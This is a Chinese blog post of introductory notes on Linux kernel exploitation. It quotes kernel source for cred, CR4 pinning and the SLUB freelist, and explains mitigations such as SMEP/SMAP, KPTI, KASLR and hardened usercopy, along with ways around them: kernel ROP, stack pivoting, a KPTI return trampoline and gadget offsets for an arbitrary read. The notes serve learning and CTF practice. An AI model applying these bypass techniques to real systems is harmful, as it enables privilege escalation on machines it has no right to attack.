<!DOCTYPE html>


<html lang="zh-CN">
  

    <head>
      <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8" />
        
      <meta name="description" content="Boom? PWN ! ! !" />
      
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title>Linux Kernel Exploit 入门笔记 |  北极落小雪</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/favicon.ico" />
       
<link rel="stylesheet" href="/dist/main.css">

      
<link rel="stylesheet" href="/css/fonts/remixicon.css">

      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
       
 

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style><!-- hexo-inject:begin --><!-- hexo-inject:end -->
    <link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>
  </html>
</html>


<body>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="app">
    
      
    <main class="content on">
      <section class="outer">
  <article
  id="post-Linux Kernel Exploit Basic--Notes"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
  Linux Kernel Exploit 入门笔记
</h1>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2024/Linux%20Kernel%20Exploit%20Basic--Notes/" class="article-date">
  <time datetime="2023-12-31T16:00:00.000Z" itemprop="datePublished">2024-01-01</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Pwn/">Pwn</a> / <a class="article-category-link" href="/categories/Pwn/Kernel/">Kernel</a>
  </div>
  
<div class="word_count">
    <span class="post-time">
        <span class="post-meta-item-icon">
            <i class="ri-quill-pen-line"></i>
            <span class="post-meta-item-text"> 字数统计:</span>
            <span class="post-count">3.4k</span>
        </span>
    </span>

    <span class="post-time">
        &nbsp; | &nbsp;
        <span class="post-meta-item-icon">
            <i class="ri-book-open-line"></i>
            <span class="post-meta-item-text"> 阅读时长≈</span>
            <span class="post-count">16 分钟</span>
        </span>
    </span>
</div>
 
    </div>
      
    <div class="tocbot"></div>




  
    <div class="article-entry" itemprop="articleBody">
       
  <p>笔者kernel pwn入门时的笔记,由于笔者接触kernel时间较短,难免出现错误….</p>
<span id="more"></span>
<h2 id="Aim"><a href="#Aim" class="headerlink" title="Aim"></a>Aim</h2><p>int commit_creds(struct cred *new) 更改进程的cred.</p>
<p>commit_creds(prepare_kernel_cred(NULL));完成权限提升</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> {</span></span><br><span class="line">	<span class="type">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="type">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="type">void</span>		*put_addr;</span><br><span class="line">	<span class="type">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="type">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="type">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we're permitted */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="comment">/* RCU deletion */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> {</span></span><br><span class="line">		<span class="type">int</span> non_rcu;			<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">	};</span><br><span class="line">} __randomize_layout;</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The initial credentials for the initial task</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> <span class="title">init_cred</span> =</span> {</span><br><span class="line">	.usage			= ATOMIC_INIT(<span class="number">4</span>),</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	.subscribers		= ATOMIC_INIT(<span class="number">2</span>),</span><br><span class="line">	.magic			= CRED_MAGIC,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	.uid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.gid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.suid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.sgid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.euid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.egid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.fsuid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.fsgid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.securebits		= SECUREBITS_DEFAULT,</span><br><span class="line">	.cap_inheritable	= CAP_EMPTY_SET,</span><br><span class="line">	.cap_permitted		= CAP_FULL_SET,</span><br><span class="line">	.cap_effective		= CAP_FULL_SET,</span><br><span class="line">	.cap_bset		= CAP_FULL_SET,</span><br><span class="line">	.user			= INIT_USER,</span><br><span class="line">	.user_ns		= &amp;init_user_ns,</span><br><span class="line">	.group_info		= &amp;init_groups,</span><br><span class="line">	.ucounts		= &amp;init_ucounts,</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>



<p>Linux 6.2后取消prepare_kernel_cred(NULL)得到init_cred的方式.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *daemon)</span></span><br><span class="line">{</span><br><span class="line">...</span><br><span class="line">	<span class="keyword">if</span> (daemon)</span><br><span class="line">		old = get_task_cred(daemon);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		old = get_cred(&amp;init_cred);</span><br><span class="line">...</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<h2 id="Defense-and-bypass"><a href="#Defense-and-bypass" class="headerlink" title="Defense and bypass"></a>Defense and bypass</h2><h3 id="SMEP-SMAP"><a href="#SMEP-SMAP" class="headerlink" title="SMEP/SMAP"></a>SMEP/SMAP</h3><p><a target="_blank" rel="noopener" href="https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-vol-3a-part-1-manual.pdf?ref=hackernoon.com">https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-vol-3a-part-1-manual.pdf?ref=hackernoon.com</a> 4.6.1</p>
<p>用户空间代码无法执行/用户空间地址无法访问<br>两种保护分别通过CR4寄存器上的20,21位使能.Linux5.1之前能关,用native_write_cr4(value)设置一下就行.之后这两位被固定了.<br><a target="_blank" rel="noopener" href="https://www.phoronix.com/news/Linux-Protect-Special-CR4-Bits">https://www.phoronix.com/news/Linux-Protect-Special-CR4-Bits</a></p>
<blockquote>
<p>With a new patch now pending in the tip tree ahead of the Linux 5.1 kernel cycle, the bits for SMEP and SMAP as well as UMIP are pinned so they can no longer be easily altered. UMIP meanwhile is the User-Mode Instruction Prevention feature to prevent execution of certain instructions in higher privilege levels and its behavior too is controlled via a CR4 bit.</p>
</blockquote>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">native_write_cr4</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> val)</span></span><br><span class="line">{</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> bits_changed = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">set_register:</span><br><span class="line">	<span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">"mov %0,%%cr4"</span>: <span class="string">"+r"</span> (val) : : <span class="string">"memory"</span>)</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (static_branch_likely(&amp;cr_pinning)) {</span><br><span class="line">		<span class="keyword">if</span> (unlikely((val &amp; cr4_pinned_mask) != cr4_pinned_bits)) {</span><br><span class="line">			bits_changed = (val &amp; cr4_pinned_mask) ^ cr4_pinned_bits;</span><br><span class="line">			val = (val &amp; ~cr4_pinned_mask) | cr4_pinned_bits;</span><br><span class="line">			<span class="keyword">goto</span> set_register;</span><br><span class="line">		}</span><br><span class="line">		<span class="comment">/* Warn after we've corrected the changed bits. */</span></span><br><span class="line">		WARN_ONCE(bits_changed, <span class="string">"pinned CR4 bits changed: 0x%lx!?\n"</span>,</span><br><span class="line">			  bits_changed);</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p>W/R (bit 1).<br>If the access causing the page-fault exception was a write, this flag is 1; otherwise, it is 0. This flag describes<br>the access causing the page-fault exception, not the access rights specified by paging.</p>
</blockquote>
<blockquote>
<p>U/S (bit 2)<br>If a user-mode access caused the page-fault exception, this flag is 1; it is 0 if a supervisor-mode access did so.<br>This flag describes the access causing the page-fault exception, not the access rights specified by paging.</p>
</blockquote>
<blockquote>
<p> If the U/S flag (bit 2) is 0 in at least one of the paging-structure<br>entries, the address is a supervisor-mode address. Otherwise, the address is a user-mode address.</p>
</blockquote>
<blockquote>
<p>I/D flag (bit 4).<br>This flag is 1 if (1) the access causing the page-fault exception was an instruction fetch; and (2) either<br>(a) CR4.SMEP = 1; or (b) both (i) CR4.PAE = 1 (either PAE paging or IA-32e paging is in use); and<br>(ii) IA32_EFER.NXE = 1. Otherwise, the flag is 0. This flag describes the access causing the page-fault<br>exception, not the access rights specified by paging</p>
</blockquote>
<h4 id="SMEP"><a href="#SMEP" class="headerlink" title="SMEP"></a>SMEP</h4><p>管理模式执行保护,在内核页表中将所有用户空间页面标记为不可执行.防止直接修改返回地址到用户空间.可以在内核栈上ROP来绕过,溢出长度不够就栈迁移到用户空间.</p>
<p>重新映射页面权限是绕不了的:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311010010806.png"></p>
<p>我说它是内核地址不就绕了?不过感觉没啥实际意义<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311010118703.png"></p>
<h4 id="SMAP"><a href="#SMAP" class="headerlink" title="SMAP"></a>SMAP</h4><p>管理模式访问保护,在内核页表中将用户空间页面标记为不可访问(不可读写),那就纯内核栈上ROP或者内核空间内栈迁移.</p>
<p>STAC一下能绕.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311010017979.png"></p>
<blockquote>
<p>CR4.SMAP allows pages to be protected from supervisor-mode data accesses. If CR4.SMAP = 1, software operating<br>in supervisor mode cannot access data at linear addresses that are accessible in user mode. Software can override<br>this protection by setting EFLAGS.AC. Section 4.6 explains how access rights are determined, including the defini-<br>tion of supervisor-mode accesses and user-mode accessibility</p>
</blockquote>
<p>可惜没有STAC的gadget,手动改CR4的SMAP的ROP链长度和提权差别不大了,没意义</p>
<h3 id="KPTI"><a href="#KPTI" class="headerlink" title="KPTI"></a>KPTI</h3><p>内核页表隔离.内核页表中有完整的用户地址空间和内核地址空间,用户页表中有完整的用户地址空间和a minimal set of kernel space address(异常处理入口点啥的).<br>防止一些侧信道的攻击手法泄露内核信息.同时KPTI在内核页表中将用户空间映射为不可执行.这意味着直接返回到用户态会触发用户级的SIGSEGV.</p>
<p>可以修改页表权限,切换回用户页表,注册用户级signal处理函数来正常返回用户态执行代码.<br>切换回用户页表:</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov     rdi, cr3</span><br><span class="line">or      rdi, 1000h</span><br><span class="line">mov     cr3, rdi</span><br></pre></td></tr></tbody></table></figure>

<p>或者用现成的swapgs_restore_regs_and_return_to_usermode+22,布置好iret的frame就行</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:FFFFFFFF81200F26                 mov     rdi, rsp</span><br><span class="line">.text:FFFFFFFF81200F29                 mov     rsp, qword ptr gs:unk_6004</span><br><span class="line">.text:FFFFFFFF81200F32                 push    qword ptr [rdi+30h]</span><br><span class="line">.text:FFFFFFFF81200F35                 push    qword ptr [rdi+28h]</span><br><span class="line">.text:FFFFFFFF81200F38                 push    qword ptr [rdi+20h]</span><br><span class="line">.text:FFFFFFFF81200F3B                 push    qword ptr [rdi+18h]</span><br><span class="line">.text:FFFFFFFF81200F3E                 push    qword ptr [rdi+10h]</span><br><span class="line">.text:FFFFFFFF81200F41                 push    qword ptr [rdi]</span><br><span class="line">.text:FFFFFFFF81200F43                 push    rax</span><br><span class="line">.text:FFFFFFFF81200F44                 jmp     short loc_FFFFFFFF81200F89</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:FFFFFFFF81200F89 loc_FFFFFFFF81200F89:</span><br><span class="line">.text:FFFFFFFF81200F89                               pop     rax</span><br><span class="line">.text:FFFFFFFF81200F8A                               pop     rdi</span><br><span class="line">.text:FFFFFFFF81200F8B                               call    cs:off_FFFFFFFF82040088</span><br><span class="line">.text:FFFFFFFF81200F91                               jmp     cs:off_FFFFFFFF82040080</span><br><span class="line">...</span><br><span class="line">.text.native_swapgs:FFFFFFFF8146D4E0                 push    rbp</span><br><span class="line">.text.native_swapgs:FFFFFFFF8146D4E1                 mov     rbp, rsp</span><br><span class="line">.text.native_swapgs:FFFFFFFF8146D4E4                 swapgs</span><br><span class="line">.text.native_swapgs:FFFFFFFF8146D4E7                 pop     rbp</span><br><span class="line">.text.native_swapgs:FFFFFFFF8146D4E8                 retn</span><br><span class="line">...</span><br><span class="line">.text:FFFFFFFF8120102E                               mov     rdi, cr3</span><br><span class="line">.text:FFFFFFFF81201031                               jmp     short loc_FFFFFFFF81201067</span><br><span class="line">...</span><br><span class="line">.text:FFFFFFFF81201067                               or      rdi, 1000h</span><br><span class="line">.text:FFFFFFFF8120106E                               mov     cr3, rdi</span><br><span class="line">...</span><br><span class="line">.text:FFFFFFFF81200FC7                               iretq</span><br></pre></td></tr></tbody></table></figure>

<p>swapgs作用<br>(ps: x86-64 架构下glibc使用FS来寻址TLS,GS不使用<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311011038241.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202402271144053.png"></p>
<h3 id="KASLR-FG-KASLR"><a href="#KASLR-FG-KASLR" class="headerlink" title="KASLR/FG-KASLR"></a>KASLR/FG-KASLR</h3><p>内核地址空间布局随机化.泄露个地址算基址就能绕.<br>FG-KASLR使偏移也随机化了,但是有不变的.<br>[text,text+0x400dc6] 可以找点gadget<br>swapgs_restore_regs_and_return_to_usermode 不变,可以正常返回用户态<br>ksymtab, starts at text+0xf85198 不变,可以找到commit_creds prepare_kernel_cred的地址.</p>
<p>构造个任意读即可:</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> pop_rax_ret = image_base + <span class="number">0x4d11</span>UL; <span class="comment">// pop rax; ret</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> read_mem_pop1_ret = image_base + <span class="number">0x4aae</span>UL; <span class="comment">// mov eax, qword ptr [rax + 0x10]; pop rbp; ret;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> pop_rdi_rbp_ret = image_base + <span class="number">0x38a0</span>UL; <span class="comment">// pop rdi; pop rbp; ret;</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kernel_symbol</span> {</span></span><br><span class="line">	  <span class="type">int</span> value_offset;</span><br><span class="line">	  <span class="type">int</span> name_offset;</span><br><span class="line">	  <span class="type">int</span> namespace_offset;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>

<h3 id="SLAB-ACCOUNT"><a href="#SLAB-ACCOUNT" class="headerlink" title="SLAB_ACCOUNT"></a>SLAB_ACCOUNT</h3><p>Linux 4.5版本引入,cred结构体由单独的kmem_cache分配</p>
<h3 id="GFP-KERNEL-ACCOUNT"><a href="#GFP-KERNEL-ACCOUNT" class="headerlink" title="GFP_KERNEL_ACCOUNT"></a>GFP_KERNEL_ACCOUNT</h3><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312212221753.png"></p>
<h3 id="CONFIG-SLAB-FREELIST-RANDOM"><a href="#CONFIG-SLAB-FREELIST-RANDOM" class="headerlink" title="CONFIG_SLAB_FREELIST_RANDOM"></a>CONFIG_SLAB_FREELIST_RANDOM</h3><p>开启后在每次取slub时会随机组织freelist.<br>slab在未开启random freelist时,是从高地址开始取堆块的. <a target="_blank" rel="noopener" href="https://lwn.net/Articles/685047/">https://lwn.net/Articles/685047/</a><br>slub在未开启random freelist时,是从低地址开始取堆块的</p>
<h3 id="CONFIG-SLAB-FREELIST-HARDENED"><a href="#CONFIG-SLAB-FREELIST-HARDENED" class="headerlink" title="CONFIG_SLAB_FREELIST_HARDENED"></a>CONFIG_SLAB_FREELIST_HARDENED</h3><p>代码来自 Linux5.11.1</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> random;</span><br><span class="line">...</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> *<span class="title function_">freelist_ptr</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> kmem_cache *s, <span class="type">void</span> *ptr,</span></span><br><span class="line"><span class="params">				 <span class="type">unsigned</span> <span class="type">long</span> ptr_addr)</span></span><br><span class="line">{</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * When CONFIG_KASAN_SW/HW_TAGS is enabled, ptr_addr might be tagged.</span></span><br><span class="line"><span class="comment">	 * Normally, this doesn't cause any issues, as both set_freepointer()</span></span><br><span class="line"><span class="comment">	 * and get_freepointer() are called with a pointer with the same tag.</span></span><br><span class="line"><span class="comment">	 * However, there are some issues with CONFIG_SLUB_DEBUG code. For</span></span><br><span class="line"><span class="comment">	 * example, when __free_slub() iterates over objects in a cache, it</span></span><br><span class="line"><span class="comment">	 * passes untagged pointers to check_object(). check_object() in turns</span></span><br><span class="line"><span class="comment">	 * calls get_freepointer() with an untagged pointer, which causes the</span></span><br><span class="line"><span class="comment">	 * freepointer to be restored incorrectly.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">long</span>)ptr ^ s-&gt;random ^</span><br><span class="line">			swab((<span class="type">unsigned</span> <span class="type">long</span>)kasan_reset_tag((<span class="type">void</span> *)ptr_addr)));</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	<span class="keyword">return</span> ptr;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="Hardened-Usercopy"><a href="#Hardened-Usercopy" class="headerlink" title="Hardened Usercopy"></a>Hardened Usercopy</h3><blockquote>
<p>Each call involves a user-space pointer and a kernel-space pointer; the user-space pointers are already checked in current kernels, so the patches only add tests for the kernel-space pointers. Those tests ensure that the address range doesn’t wrap past the end of memory, that the kernel-space pointer is not null, and that it does not point to a zero-length kmalloc() allocation (i.e. ZERO_OR_NULL_PTR() is false). Also, if the address range overlaps the kernel text (code) segment, it is rejected.</p>
<p>Beyond that, if the kernel-space address points into an object that has been allocated from the slab allocator, the patches ensure that what is being copied fits within the size of the object allocated. This check is performed by calling PageSlab() on the kernel address to see if it lies within a page that is handled by the slab allocator; it then calls an allocator-specific routine to determine whether the amount of data to be copied is fully within an allocated object. If the address range is not handled by the slab allocator, the patches will test that it is either within a single or compound page and that it does not span independently allocated pages.</p>
<p>In addition, for copies involving the stack, the copied range must fit within the current process’s stack. If there is architecture support for identifying stack frames, the copied range must fit within a single frame.</p>
</blockquote>
<p>总结一下就是:</p>
<ol>
<li>地址范围不能越过内存边界(wrap past the end of memory) </li>
<li>内核空间指针不为NULL</li>
<li>不允许指向 kmalloc 分配的零长度区域</li>
<li>地址范围不能与.text段重合</li>
<li>如果地址范围由slab管理,则地址范围需符合分配对象的大小</li>
<li>(接5)否则地址范围不能跨越独立分配的页面.</li>
<li>如果涉及到栈则不允许超出当前进程的栈空间</li>
</ol>
<p>以及一个副作用:</p>
<blockquote>
<p>If usersize is non-zero (i.e., the cache is user-space accessible), this cache is not merged with any other cache on the system.This is a major downside from the exploitation perspective since all general-purpose caches are now marked as user-space accessible in create_boot_cache() where useroffset is set to 0 and usersize is the entire cache/object size. As a result, general-purpose caches are no longer mergeable with special-purpose caches. This is true even if CONFIG_HARDENED_USERCOPY is disabled!</p>
</blockquote>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310311030161.png"></p>
